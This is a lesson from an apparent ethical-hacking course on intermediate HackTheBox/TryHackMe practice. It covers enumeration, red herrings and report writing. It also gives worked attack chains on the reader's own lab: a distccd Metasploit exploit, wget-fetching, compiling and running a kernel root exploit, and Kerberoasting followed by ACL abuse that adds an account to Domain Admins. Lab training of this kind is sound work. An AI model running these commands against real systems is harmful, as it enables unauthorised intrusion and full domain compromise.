@@ -1,0 +1,223 @@
+---
+trackId: cybersecurity-ethical-hacking
+tier: 3
+title: "HackTheBox / TryHackMe Intermediate Practice"
+order: 6
+estimatedHours: 20
+slug: hackthebox-tryhackme-intermediate-practice
+---
+
+## From Easy to Intermediate: What Actually Changes
+
+The Tier 2 easy-box module taught you a linear loop: scan, find one obviously-versioned service, pull the matching public exploit, get a shell, run one privesc checklist, done. Intermediate difficulty breaks every one of those assumptions on purpose. It isn't "the same process but harder" — it's a different process:
+
+| Attribute | Easy box | Intermediate box |
+|---|---|---|
+| Foothold | One service, one CVE, version string handed to you in the banner | Foothold requires combining two or more low-severity findings (an exposed `.git` directory + a weak default credential, a readable backup file + a reused password) |
+| Service banners | `Apache/2.4.18 (Ubuntu)` — exact version, exact exploit | Banners genericized, headers stripped, or deliberately wrong (a service answering on an unusual port, a banner left over from a previous, unrelated version) |
+| Red herrings | Rare | Deliberate: an open port running nothing exploitable, a "vulnerable" CMS plugin that's actually patched, a tempting SUID binary that's a dead end |
+| Privilege escalation | Single misconfigured sudo rule or one well-known kernel CVE | Chained: a low-priv foothold that only yields access to *enumerate* the next pivot, which yields credentials for a *third* service, which has the actual escalation path |
+| Hand-holding | Task hints spell out the technique | None — you're expected to recognize the pattern from first principles |
+
+The practical consequence: you can no longer scan-and-exploit. You have to build a map of the host (and in Active Directory contexts, the domain) before you commit to an attack path, because the obvious path is frequently the red herring.
+
+## Enumeration Without Hand-Holding
+
+When a banner doesn't hand you a version, you fingerprint manually. Against your own Juice Shop instance, compare what a naive scan gives you versus what response analysis gives you:
+
+```bash
+curl -sI http://localhost:3000
+```
+```text
+HTTP/1.1 200 OK
+X-Powered-By: Express
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+Content-Type: text/html; charset=UTF-8
+```
+
+No version number anywhere — but `X-Powered-By: Express` plus the specific `Feature-Policy` header shape and the exact 404 page wording are themselves a fingerprint. This is the skill an intermediate box forces: diffing response headers, error page templates, and default file paths against known framework/CMS fingerprints instead of reading a version string off a silver platter.
+
+For service enumeration depth, run full-range scans, not top-1000:
+
+```bash
+nmap -p- -sC -sV --min-rate 2000 -oA scans/full 192.168.56.102
+```
+
+Against your Metasploitable2 VM this still surfaces verbose banners (it's an intentionally old target), but the habit matters more than this one result: always scan all 65535 ports before you commit to a path, because intermediate boxes routinely hide the real foothold on a non-default port while a decoy sits on the expected one.
+
+For SMB/AD enumeration against your home-lab domain controller, go past a basic `-sV` pass:
+
+```bash
+enum4linux-ng -A 192.168.56.102
+nxc smb 192.168.56.10 -u '' -p '' --shares
+nxc ldap 192.168.56.10 -u '' -p '' --users
+```
+
+`nxc` (NetExec, the maintained successor to CrackMapExec) with a null session tells you immediately whether anonymous LDAP/SMB bind is permitted in your lab's domain — exactly the kind of low-severity misconfiguration that becomes step one of a chain rather than the whole story.
+
+## Time-Boxing and Recognizing Red Herrings
+
+Set a hard limit — 20 to 30 minutes — on any single avenue before you step back and re-check your enumeration notes. Signs you're in a red herring:
+
+- A service version matches a public CVE, but the exploit fails cleanly and consistently (not a flaky connection issue) — the version banner was faked.
+- A "juicy" file (backup archive, `.git` directory, config file) contains credentials that don't work anywhere you've found so far.
+- A SUID binary or writable cron job exists but GTFOBins/manual testing shows no actual escalation primitive for it.
+
+The discipline is: log the dead end in your notes with a timestamp and move to the next enumerated surface. Do not re-attempt the same dead end twice without new information. This single habit is the biggest differentiator between people who finish intermediate boxes in a few hours and people who burn a weekend on one wrong assumption.
+
+## Composite Attack Patterns at Intermediate Difficulty
+
+These are generic archetypes — not any specific machine — that show up repeatedly once you leave easy difficulty:
+
+**Pattern A — Low-priv web foothold, pivot via internal-only service.** A public-facing app leaks a local file read (path traversal or SSRF) that doesn't directly give code execution, but it reveals an SSH private key or a config file with credentials for a service bound only to `127.0.0.1`. You port-forward that internal service through your existing access, find a second, unpatched vulnerability in *it*, and that's where the real foothold lives.
+
+**Pattern B — Credential reuse across trust boundaries.** A low-priv shell on one host yields a password hash or plaintext credential in a config file, history file, or memory dump. That credential is reused — not for the account that owns it, but for a *different* service account that happens to share the password, which has rights the original account doesn't.
+
+**Pattern C — Enumeration-gated privesc.** The actual privilege escalation primitive (a misconfigured sudo rule, a writable PATH, an ACL misconfiguration in AD) is real and exploitable from the start, but it's invisible until you run a *second* enumeration pass with a different tool, because the first tool you tried doesn't check for that specific primitive class.
+
+Internalize these as shapes, not steps — recognizing "this smells like Pattern B" is what replaces hand-holding.
+
+## Worked Chain: Two-Stage Escalation on Your Own Metasploitable2 Instance
+
+A single-service foothold that does not land root directly is the simplest honest demonstration of chaining. Enumerate:
+
+```bash
+nmap -p- -sV --open 192.168.56.102
+```
+```text
+3632/tcp open  distccd  distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+```
+
+distccd executes arbitrary commands by design when misconfigured to accept remote compile jobs — this is CVE-2004-2687. Against your own VM:
+
+```text
+msf6 > use exploit/unix/misc/distcc_exec
+msf6 > set RHOSTS 192.168.56.102
+msf6 > set LHOST 192.168.56.1
+msf6 > run
+[*] Command shell session 1 opened
+```
+
+```bash
+id
+```
+```text
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+That's stage one: code execution as an unprivileged service account, not root. Stage two is local privilege escalation. Metasploitable2's kernel (2.6.24) is vulnerable to the udev netlink local root exploit (CVE-2009-1185):
+
+```bash
+wget http://192.168.56.1/8572.c -O /tmp/8572.c
+gcc /tmp/8572.c -o /tmp/8572
+/tmp/8572 $(pgrep udevd)
+id
+```
+```text
+uid=0(root)
+```
+
+Two independent, individually "easy" vulnerabilities — one remote execution bug, one local kernel bug — chained because neither one alone gets you to root. That's the intermediate pattern in miniature.
+
+## Worked Chain: Kerberoasting to Domain Admin in Your AD Lab
+
+Starting from a single domain user's credentials (your initial foothold from an earlier module's phishing/credential-stuffing exercise), enumerate Kerberoastable service accounts:
+
+```bash
+impacket-GetUserSPNs -dc-ip 192.168.56.10 -request \
+  -outputfile spns.txt LAB.LOCAL/jdoe:'Summer2024!'
+```
+```text
+ServicePrincipalName           Name     PasswordLastSet      Delegation
+------------------------------  -------  -------------------  ----------
+MSSQLSvc/sql01.lab.local:1433  svc_sql  2023-11-02 09:14:21
+```
+
+Crack the extracted TGS-REP offline — this is a service ticket encrypted with the service account's own password hash, not a domain secret, so it's crackable without touching the DC again:
+
+```bash
+hashcat -m 13100 -a 0 spns.txt /usr/share/wordlists/rockyou.txt
+```
+```text
+$krb5tgs$23$*svc_sql$LAB.LOCAL$MSSQLSvc/sql01.lab.local~1433*:...:Summer2024!
+```
+
+Now run BloodHound against the domain with the cracked account to find what it's actually worth:
+
+```bash
+bloodhound-python -u svc_sql -p 'Summer2024!' -d lab.local -ns 192.168.56.10 -c All
+```
+
+Most home-lab AD builds deliberately carry at least one excessive-rights misconfiguration from the lab-build exercise earlier in this tier — a service account with `GenericAll` on a privileged group, a help-desk group with `GenericWrite` on Domain Admins. Open BloodHound's GUI, run "Shortest Paths to Domain Admins," and if `svc_sql` sits on that path with `GenericAll` over the Domain Admins group, abuse it directly:
+
+```bash
+bloodyAD --host 192.168.56.10 -d lab.local -u svc_sql -p 'Summer2024!' \
+  add groupMember "Domain Admins" svc_sql
+```
+
+Low-priv foothold → Kerberoasting → offline crack → BloodHound path discovery → ACL abuse. Four distinct techniques, none individually "intermediate," chained into a full domain compromise.
+
+## Documentation Discipline While You Work
+
+Write the report as you go, not after. Keep a running log file per target:
+
+```bash
+script -a ~/lab-notes/metasploitable2-session.log
+```
+
+Number and hash every piece of loot the moment you pull it:
+
+```bash
+sha256sum loot/passwd loot/spns.txt > loot/hashes.txt
+```
+
+Maintain one note per host with: IP/hostname, open ports and confirmed versions, every credential found (with source), every dead end tried (with why it failed), and a running attack-path diagram. When you reach the end, the report is an edit pass on existing notes, not a from-scratch rewrite under time pressure.
+
+## From Lab Notes to a Retired-Machine Report
+
+If you ever publish a write-up of an HTB or TryHackMe machine, the platform policy covered earlier in this track still applies without exception: **retired machines only**, confirmed via the platform's own status page immediately before publishing, never active rooms or machines. Extend this tier's PTES report structure with a CTF-specific header and framing:
+
+```text
+# Write-Up: [PLACEHOLDER-RETIRED-01] (Platform, Retired, Medium)
+
+STATUS: Retired as of [date] — confirmed via platform status page
+before publishing. Independent training exercise, not an authorized
+client engagement.
+
+## 1. Scope & Rules of Engagement
+- Platform: [name]; machine difficulty: Medium; role: solo practice
+- Target IP assigned by platform VPN, not a persistent asset
+- Flag values are not reproduced per platform convention
+
+## 2. Methodology
+Standard PTES phases: enumeration, exploitation, privilege escalation.
+
+## 3. Findings
+| # | Weakness | CWE | Evidence | Real-world remediation |
+|---|---|---|---|---|
+| 1 | Outdated service, known RCE | CWE-1104 | nmap + exploit output | Patch management cadence |
+| 2 | Credential reuse across services | CWE-262 | cracked hash reused | Unique per-service credentials, vaulting |
+
+## 4. Attack Narrative
+Step-by-step commands and output, foothold through privilege
+escalation, cross-referenced to the Findings table above.
+
+## 5. Lessons Learned
+Techniques demonstrated, time spent per phase, what would have been
+faster with better initial enumeration.
+```
+
+The remediation column is what separates a CTF write-up written like a trophy post from one that reads like a pentest deliverable — every exploited weakness gets mapped to how a real sysadmin would have prevented it, which is also exactly what a hiring manager is screening for.
+
+## Exercise: Chain Your Own Intermediate-Style Path (AD Home Lab)
+
+In your own AD home lab, deliberately configure one excessive ACL two hops away from Domain Admins — pick the group and the grant yourself, but don't write down which one. Then, starting only from a single low-privilege domain user's credentials:
+
+1. Enumerate the domain for Kerberoastable accounts and crack what you find.
+2. Run BloodHound and use the Cypher query panel (not a pre-built query) to search for any principal with a path to Domain Admins.
+3. Abuse whatever path you find to reach Domain Admin.
+4. Write it up using the report skeleton above, including at least one documented dead end.
+
+Hint: force the discovery with Cypher instead of pre-built queries — something like matching all paths of outbound-control edges (`GenericAll`, `GenericWrite`, `WriteDacl`, `AddMember`) from any owned principal to the Domain Admins group — rather than clicking "Shortest Path." The habit of writing your own query instead of relying on canned ones is the exact skill an intermediate box is testing when it removes the obvious prompts.
